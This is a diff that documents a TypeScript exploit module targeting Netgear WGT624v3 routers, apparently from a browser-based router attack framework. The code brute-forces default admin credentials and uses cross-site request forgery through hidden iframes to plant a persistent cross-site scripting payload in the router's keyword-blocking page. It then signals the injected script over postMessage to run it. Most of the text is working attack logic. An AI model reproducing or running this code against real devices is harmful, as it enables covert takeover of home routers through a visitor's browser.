@@ -9,11 +9,19 @@ interface FormParam {
     value:string
 }
 
+/**
+ * A payload implementation for the Netgear WGT624v3 router.
+ */
 class WGT624v3Payload extends BasePayload {
+    /**
+     * A (short) list of username and password pairs to test. As
+     * each test takes a fairly long time, this is limited to only
+     * the default and blank passwords for now.
+     * @see http://portforward.com/default_username_password/NetGear.htm
+     */
     private static CREDENTIALS_TO_TEST:BasicAuthCredential[] = [
         {username: 'admin', password: ''},
         {username: 'admin', password: 'password'},
-        {username: 'admin', password: 'aapm'},
     ];
 
     constructor(fingerprintResult:FingerprintResult) {
@@ -48,6 +56,16 @@ class WGT624v3Payload extends BasePayload {
             });
     }
 
+    /**
+     * Sends a POST request to the specified URL, with the provided parameters.
+     *
+     * This request is sent using a form element in an IFrame, as XHR is
+     * not allowed due to the router not sending any CORS headers.
+     *
+     * @param url The url to send the request to.
+     * @param params Params to be included in the request.
+     * @return {Promise} A promise resolved when the request is finished.
+     */
     private sendPostRequest(url:string, params:FormParam[]):Promise<any> {
         return new Promise((resolve) => {
             let frame:HTMLIFrameElement = document.createElement('iframe');
@@ -77,6 +95,16 @@ class WGT624v3Payload extends BasePayload {
         });
     }
 
+    /**
+     * Uses CSRF to inject a script tag that references the netgear_WGT624v3 exploit.
+     *
+     * The script tag is injected by using a persistent XSS defect in the keyword
+     * blocking configuration of the router. However, this requires two requests,
+     * one for adding the new XSS keyword and one for actually saving the keyword.
+     *
+     * @param credentials The credentials to use for the request.
+     * @return {Promise} A promise resolved once both requests have been sent.
+     */
     private tryInjectPayload(credentials:BasicAuthCredential):Promise<any> {
         let exploitSrc = document.location.href.replace('index.html', '') + 'netgear_wgt624v3.js';
         let keywordUrl = 'http://' + credentials.username + ':' + credentials.password + '@'
@@ -102,7 +130,15 @@ class WGT624v3Payload extends BasePayload {
             .then(() => this.sendPostRequest(keywordUrl, saveKeywordsParams))
     }
 
-    private waitForMessage(expectedMessage:string, timeout:number = 4000):Promise<Window> {
+    /**
+     * Waits for a message, sent on the window via postMessage.
+     *
+     * @param expectedMessage The message text expected.
+     * @param timeout Time to wait for the message (ms).
+     * @return {Promise} A promise resolved if the expectedMessage was
+     * received before the timeout.
+     */
+    private waitForMessage(expectedMessage:string, timeout:number = 4000):Promise<any> {
         return new Promise((resolve, reject) => {
             let timeoutId:number;
             let done = (success:boolean, reason?:string) => {
@@ -129,11 +165,18 @@ class WGT624v3Payload extends BasePayload {
         });
     }
 
+    /**
+     * Clears any queued messages on the window.
+     * @return {Promise} A promise resolved when the messages
+     * has been cleared.
+     */
     private clearQueuedMessages() {
         return new Promise((resolve) => {
             window.onmessage = () => {
                 // NOP
             };
+            // By using setImmediate, we should allow all queued events
+            // to be dispatched.
             setImmediate(() => {
                 window.onmessage = null;
                 resolve();
@@ -141,7 +184,20 @@ class WGT624v3Payload extends BasePayload {
         });
     }
 
+    /**
+     * Attempts to run the payload, has it been injected.
+     *
+     * This uses window messaging to communicate with the exploit
+     * injected. If the injection was successful, the exploit should
+     * respond.
+     *
+     * @param credentials The credentials to use.
+     * @return {Promise<boolean>} A promise, resolved with a boolean indicating if
+     * the payload was succesfully run or not.
+     */
     private tryRunInjectedPayload(credentials:BasicAuthCredential):Promise<boolean> {
+        // Create an IFrame pointing to the page that should, if the
+        // script was indeed injected, have the injected payload.
         let frame:HTMLIFrameElement = document.createElement('iframe');
         frame.src = 'http://' + credentials.username + ':' + credentials.password + '@'
             + this.fingerprintResult.ip + '/BKS_keyword.htm';
@@ -149,6 +205,9 @@ class WGT624v3Payload extends BasePayload {
         frame.style.display = 'none';
         document.body.appendChild(frame);
 
+        // If the script was injected, it will send a message to the top window (i.e. us)
+        // with the content #LOADED#. If that happens, we know the injection was successful
+        // and we give it the go-ahead to run, by sending the "#OK#" message.
         return Promise.resolve()
             .then(() => this.waitForMessage("#LOADED#"))
             .then(() => {
